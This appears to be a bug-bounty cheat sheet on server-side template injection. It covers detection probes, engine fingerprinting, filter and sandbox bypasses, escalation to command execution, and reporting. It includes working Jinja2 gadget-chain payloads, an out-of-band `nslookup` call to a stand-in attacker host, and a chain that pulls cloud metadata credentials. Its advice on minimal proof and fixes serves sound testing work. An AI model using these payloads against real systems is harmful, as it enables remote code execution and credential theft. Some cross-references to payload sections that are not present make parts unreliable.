# Server-Side Template Injection (SSTI)

> One-line summary: User input rendered inside a server-side template (Jinja2, Twig, FreeMarker, ...) executes expressions — `{{7*7}}` proves it, sandbox escapes turn it into RCE and a critical bounty.

## Overview

SSTI occurs when user input is concatenated into a template string and then rendered by a template engine, instead of being passed as a variable (e.g. `render_template_string("Hello " + name)` instead of `render_template("hello.html", name=name)`). Because template expressions are evaluated server-side, `{{7*7}}` returns `49` — and engine-specific gadget chains reach arbitrary file read, environment variables (AWS keys, DB credentials), and OS command execution. It most commonly appears in Flask/Jinja2 (Python), Twig (PHP), FreeMarker/Velocity (Java), ERB (Ruby), Smarty, Handlebars/Nunjucks (Node), and in SaaS tools that let users customize email/PDF templates. It pays critical because the demo payload is one request and the escalation is full RCE.

## Where to find it

- "Custom template" features: email notification templates, invoice/report templates, SMS templates, signature editors
- Name/username/company fields reflected into emails or PDFs generated server-side (welcome emails, invoices, receipts)
- Preview functions: "preview your template", `/preview?template=`, marketing campaign builders
- Error pages that render the path/message: `/{{7*7}}`, `/en/{{7*7}}` (404/500 handlers)
- Subject/body parameters in contact forms, feedback forms, ticket subjects
- Translation/i18n parameters: `?lang={{7*7}}`
- Redirect/verify pages rendering email addresses or tokens
- SaaS integrations: CMS themes, storefront themes, docs generators (Hugo/Jekyll with user content), PDF renderers (wkhtmltopdf + Twig)
- Frameworks: Flask/Jinja2, Django (rare — templates are sandboxed but `{% debug %}` is a signal), Twig/Symfony, FreeMarker, Velocity, Smarty, Mako, ERB, Handlebars (context-dependent — see edge cases)

## Methodology

1. **Find candidates** — anywhere your input appears in output that is generated by a template engine: emails, PDFs, HTML fragments, error pages. Reflect a unique marker first (`bugbounty1337`) and confirm it echoes back.
2. **Detection probe** — send the polyglot and math expressions, watching for evaluation, not just reflection:
   - `${{<%[%'"}}%\` — a hard "template error" on this string is a strong hint.
   - `{{7*7}}` → `49` (Jinja2, Twig, Nunjucks, Handlebars-with-context), `#{7*7}` → `49` (Ruby ERB/Slim... actually `#{7*7}` is Ruby string interpolation — works in Ruby-flavored engines), `${7*7}` → `49` (FreeMarker, Velocity via `#set`, EL/Thymeleaf, Mako via `${}`), `<%= 7*7 %>` → `49` (ERB, EJS).
   - `{{7*'7'}}` — Jinja2 returns `7777777` (string multiply), Twig returns `49`. This one request distinguishes Python from PHP engines.
3. **Fingerprint the engine** — pick engine-specific probes from the payloads below; the arithmetic result plus error text (`jinja2.exceptions`, `Twig\Error`, `FreeMarker template error`, `Smartest`) usually identifies it outright. Also try malformed syntax `{{7*}}` — each engine's error message names itself.
4. **Confirm without damage** — the arithmetic result IS the confirmation. For blind/blind-expression contexts, use an oracle: a boolean `{{1==1}}` vs `{{1==2}}` that changes output length, or a time delay (`{{ ... sleep(5) }}` — Jinja2 via Python os/`time`).
5. **Escalate to something meaningful** — read a harmless file (`/etc/passwd` header or `/etc/hostname`), print `id`, or dump env vars (redact secrets in the report). Pick the minimal proof; do not drop a reverse shell just because you can.
6. **Blind SSTI (no visible output)** — payloads render into emails/PDFs you can't see. Approach: time-based (`{{ self.__init__.__globals__.__builtins__.__import__('time').sleep(5) }}` in Jinja2), OOB (Jinja2: render `{{ request.application... }}`-free variant pulling a URL — easier: cause a DNS lookup via `os.popen('nslookup x.attacker.oast.pro')`), or cause a distinct error (invalid expression → different error page vs 200).

## Bypasses & edge cases

- **Underscore/dot filters** — Jinja2: `{{ lipsum|attr('__globals__') }}`, `{{ request|attr('application')|attr('__globals__') }}`; use `request.args`/`request.values` to feed keywords (`?c=os&f=popen`).
- **Quote filters** — build strings with `chr()`: Jinja2 `{{ chr(111)+chr(115) }}`; or pull from `request.args`.
- **"os"/"system" keyword blacklists** — concatenate (`'o'+'s'`), hex/unicode escapes, `attr` chains, alternative sinks (`subprocess.Popen`, `os.popen` vs `os.system`).
- **`{{` stripped/mangled** — try `{%print(7*7)%}` (Jinja2), `{%%}` statements, `{{''.__class__}}` wrapped in HTML entities, or URL-encoded braces if the WAF decodes once.
- **Nested/wrapped templates** — input may be rendered twice (template-in-template): a payload that outputs another payload (`{% raw %}` misuse) can survive one sanitization pass but not two.
- **Sandboxed engines** — Jinja2 `SandboxedEnvironment` blocks attribute access but historically bypassable via `|attr`, `format_map`, `%`-format; Twig sandbox bypasses via `filter`/`map`/`sort`/`reduce` (above) work on 1.41/2.x/3.x without the sandbox flag.
- **ES/JS engines (Handlebars, EJS)** — Handlebars without prototype-access helpers is safe; a lot of "Handlebars SSTI" reports are actually reflected XSS or Nunjucks. Verify server-side execution (time-based) before claiming RCE.
- **Django** — templates are sandboxed by design; `{% debug %}` / `{{ settings.SECRET_KEY }}` sometimes leaks; treat any Django "SSTI" as likely a misconfigured `Engine`/`render_to_string` with user templates.
- **PDF pipelines** — engines like wkhtmltopdf render HTML+JS, so "SSTI" findings there are often just client-side JS execution on the PDF generator host (still useful — chain to SSRF via `<iframe src=http://169.254.169.254/...>`).
- **Blind contexts** — output goes to email/PDF: prefer time-based over tries-and-see; one 5s sleep is definitive, ten "no output" attempts is not.

## Escalation & chaining

- **SSTI → RCE** — the direct path: `os.popen`/`Runtime.exec`/`filter('system')` gives command execution on the app server; then standard post-RCE (env secrets, DB credentials from config, internal network reach).
- **SSTI → secrets → lateral movement** — `{{config}}` / env dump leaks `SECRET_KEY`, JWT signing keys, cloud IAM keys, DB URLs; use them to forge sessions or reach internal services.
- **SSTI → SSRF** — `{{ request.application... urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/').read() }}` reaches cloud metadata from inside.
- **SSTI → account takeover** — Flask `SECRET_KEY` from `{{config}}` lets you forge session cookies with `flask-unsign`.
- **SSTI in email templates → mass impact** — a payload in a shared template fires for every recipient — often escalates severity (stored, recurring execution) and pays more than reflected SSTI.
- **SSTI → file read → source review** — read app source (`/proc/self/cwd/app.py`) to find further bugs: hardcoded credentials, debug routes, hidden admin paths.

## Report notes

- The exact template string and its evaluated output: request `name={{7*7}}` → response contains `49`, plus the raw HTTP request/response.
- Engine identification evidence: the specific error text that names the engine/version (`jinja2.exceptions.UndefinedError`, `Twig\Error\SyntaxError ... line 1`).
- RCE proof: output of `id` (or `whoami`) and one file read (`/etc/hostname` is safe, `/etc/passwd` is standard — do not dump secrets unredacted). One command output is enough; do not spray commands.
- Blind: three timed runs of the sleep payload with ms values vs baseline, and the raw request for each.
- If secrets were exposed: name the variable and value class (`SECRET_KEY present, redacted`) — never paste full cloud keys; note the risk and recommend rotation.
- Impact: "unauthenticated attacker achieves RCE as `www-data` on the app server via `?name=` on `GET /greet`; server holds `AWS_ACCESS_KEY_ID` with S3 write access" (only say the latter if you verified it minimally).
- Fix: never concatenate user input into templates — render with `render_template` and data variables; sandbox the engine; escape/validate user-supplied template sources.
